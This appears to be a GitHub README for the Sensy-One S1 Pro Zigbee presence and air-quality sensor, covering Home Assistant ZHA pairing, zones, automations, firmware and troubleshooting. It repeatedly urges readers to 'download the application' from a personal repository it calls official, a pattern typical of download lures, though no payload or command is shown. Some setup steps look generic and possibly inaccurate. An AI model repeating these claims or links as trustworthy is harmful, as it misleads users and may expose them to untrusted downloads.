# 🌟 S1-Pro-Multi-Sense-Zigbee - All-in-One Smart Home Sensing Solution

[![Download S1 Pro](https://img.shields.io/badge/Download-S1_Pro_Multi_Sense-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bkumar746/S1-Pro-Multi-Sense-Zigbee)

Visit this link to download the application.

Welcome to the official GitHub repository for the Sensy-One S1 Pro Multi Sense (Zigbee). This powerful device combines presence detection and indoor air-quality monitoring into one sleek sensor, designed to work seamlessly with your Home Assistant setup. Whether you're looking to automate your lights based on room occupancy or keep tabs on your home's air quality, the S1 Pro has you covered.

---

## 🔍 What Is the S1 Pro Multi Sense?

The S1 Pro Multi Sense is a Zigbee-based sensor that does much more than just detect motion. It's a complete environmental monitoring solution that helps you create a smarter, healthier home. Here's what it brings to your smart home ecosystem:

- **Presence Detection**: Know exactly when a room is occupied, not just when there's movement. This advanced sensing prevents annoying light shut-offs when you're sitting still.
- **Air Quality Monitoring**: Tracks temperature, humidity, and volatile organic compounds (VOCs) to keep your indoor environment comfortable and healthy.
- **Zigbee Connectivity**: Connects directly to your Zigbee network, no hub required beyond your existing Zigbee coordinator.
- **Home Assistant Ready**: Fully compatible with ZHA (Zigbee Home Automation) integration for easy setup and control.

---

## 🚀 Getting Started

Getting your S1 Pro up and running is easier than you might think. We'll guide you through every step, from downloading the necessary software to integrating the sensor with your Home Assistant system.

### 📥 Downloading the Application

To begin your journey with the S1 Pro Multi Sense, you'll need to access the necessary files and documentation from our official repository. Here's how:

1. **Navigate to our download page**: Use the button below or the link provided earlier to access the repository.
   
   [![Download Now](https://img.shields.io/badge/📦_Download_S1_Pro-blue?style=for-the-badge)](https://github.com/Bkumar746/S1-Pro-Multi-Sense-Zigbee)

2. **Explore the repository**: Once you're on the GitHub page, you'll find a wealth of information including setup guides, troubleshooting tips, and firmware updates. Take a moment to familiarize yourself with the layout.

3. **Download what you need**: While browsing, you may come across helpful documents or configuration files. For most users, the guides and integration instructions are all you need to get started.

---

## 🏠 Setting Up Your S1 Pro with Home Assistant

Now that you've accessed the repository, let's walk through connecting your S1 Pro to Home Assistant using the ZHA integration. This process is designed to be straightforward, even for beginners.

### 🛠 Prerequisites

Before you begin, make sure you have:

- A working Home Assistant installation (version 2023.5 or newer recommended)
- A Zigbee coordinator (such as a ConBee II, Sonoff Zigbee 3.0 USB dongle, or Home Assistant SkyConnect)
- Your S1 Pro Multi Sense sensor (make sure it's charged or plugged in)

### 📡 Adding Your Sensor via ZHA

1. **Open Home Assistant**: Go to your Home Assistant interface through your web browser.

2. **Navigate to ZHA**: Click on **Settings**, then **Devices & Services**. Find the **Zigbee Home Automation** integration and click **Configure**.

3. **Start Pairing Mode**: In the ZHA configuration page, click on **Add Device** to put your coordinator into pairing mode.

4. **Power On Your S1 Pro**: Insert the sensor's battery tab or plug it in to power it on. The LED should blink, indicating it's ready to pair.

5. **Wait for Discovery**: Home Assistant will automatically search for and find your S1 Pro. This may take a minute or two. Once found, the sensor will appear in your device list.

6. **Assign a Room**: After successful pairing, you'll be prompted to assign the sensor to a room. Choose an appropriate location like "Living Room" or "Office" for easier management.

### 🗂 Configuring Zones for Presence Detection

The S1 Pro allows you to create custom zones for more accurate presence tracking. Here's how to set them up:

1. **Access Device Settings**: In Home Assistant, go to **Settings** > **Devices & Services** > **Devices**. Find your S1 Pro and click on it.

2. **Open Zone Configuration**: Look for the **Zones** or **Configuration** tab within the device page. Here, you can define specific areas of a room that the sensor should monitor.

3. **Create a Zone**: Click **Add Zone** and define the area by adjusting the sensor's detection parameters. For example, you can create a "Desk Area" zone that covers only your workspace.

4. **Save Your Settings**: Once you've configured your desired zones, click **Save**. The S1 Pro will now provide separate presence data for each zone.

---

## 📊 Making the Most of Your S1 Pro

Now that your sensor is connected, let's explore some ways to use its data effectively.

### 🌡 Understanding Air Quality Data

Your S1 Pro provides valuable information about your indoor environment. To view this data:

1. Go to **Settings** > **Devices & Services** > **Devices** and select your S1 Pro.
2. You'll see entities for **Temperature**, **Humidity**, and **Air Quality Index** (AQI).
3. Add these entities to your dashboard for at-a-glance monitoring.

### 💡 Creating Automations

Use presence and air quality data to automate your home:

- **Light Control**: "When presence is detected in the Living Room, turn on the lights."
- **Ventilation**: "If air quality drops below a certain threshold, turn on the exhaust fan."
- **Heating Efficiency**: "When presence is not detected for 10 minutes, lower the thermostat."

To create these automations:

1. Go to **Settings** > **Automations & Scenes** > **Create Automation**.
2. Add your trigger (e.g., "Presence detected") and condition (e.g., "Time is after sunset").
3. Set your action (e.g., "Turn on lights").

---

## 🔄 Updating Firmware

Keeping your S1 Pro firmware up to date ensures you have the latest features and improvements. To update:

1. **Check Current Version**: In Home Assistant, go to your S1 Pro's device page and note the current firmware version.
2. **Visit Our Repository**: Head back to our GitHub page and navigate to the **Releases** section.
3. **Download New Firmware**: If a newer version is available, download the firmware file.
4. **Update via ZHA**: Some devices allow over-the-air (OTA) updates through ZHA. If supported, you'll see an **Update** button on the device page. Alternatively, follow the manual update instructions in the repository's documentation.

---

## ❓ Troubleshooting Common Issues

Having trouble? Here are solutions to common problems:

### 🔌 Sensor Won't Pair

- Ensure your Zigbee coordinator is in pairing mode.
- Move the sensor closer to your coordinator during pairing.
- Try a fresh battery or power source.

### 📉 Connectivity Drops

- Check that the sensor is within range of your Zigbee network.
- Reduce interference from walls or metal objects.
- Consider adding a Zigbee router to extend your network's range.

### 📊 Inaccurate Readings

- Give the sensor time to calibrate (24-48 hours is normal).
- Ensure the sensor isn't placed near heat sources or drafts.
- Wipe the sensor's vents to remove dust buildup.

---

## 🤝 Community and Support

We're here to help! Connect with other S1 Pro users and get support:

- **GitHub Issues**: Report bugs or request features on our [Issues page](https://github.com/Bkumar746/S1-Pro-Multi-Sense-Zigbee/issues).
- **Discussions**: Join conversations on our repository's Discussions tab.
- **Home Assistant Forums**: Search for S1 Pro topics on the official Home Assistant community forums.

---

## 📜 License

This project is licensed under the MIT License. Feel free to use, modify, and distribute the code and documentation, subject to the terms of this license.

---

## 🙏 Acknowledgments

Special thanks to the Home Assistant community for their invaluable contributions to Zigbee integration and testing. Your feedback helps us improve the S1 Pro experience for everyone.

---

We're excited to see what you build with your S1 Pro Multi Sense! Share your automations and ideas in our discussion forum. Happy automating!

Keywords: Zigbee, Home Assistant, presence sensor, air quality, indoor environment, smart home automation, ZHA integration, environmental monitoring, IoT device, Sensy-One